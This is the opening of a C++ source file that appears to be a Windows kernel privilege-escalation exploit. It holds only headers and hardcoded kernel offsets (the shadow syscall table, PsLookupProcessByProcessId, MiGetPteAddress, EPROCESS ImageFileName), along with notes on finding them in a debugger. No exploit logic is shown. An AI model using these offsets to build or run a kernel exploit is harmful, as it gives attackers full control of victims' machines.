#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <ioringapi.h>
#include <ntstatus.h>

// ? nt!KeServiceDescriptorTableShadow - nt
#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc6280
// Check in IDA => NTDLL!NtSetQuotaInformationFile
#define NtSetQuotaInformationFile_syscallnumber 0x1b8
// 1: kd> ? nt!PsLookupProcessByProcessId - nt
#define PsLookupProcessByProcessId_Offset_fromNT 0x907900
// ? nt!MiGetPteAddress + 0x13 - nt
#define MiGetPteAddress_Offset_fromNT 0x4336e3
// dt _EPROCESS ImageFileName
#define imageFileNameOffset 0x338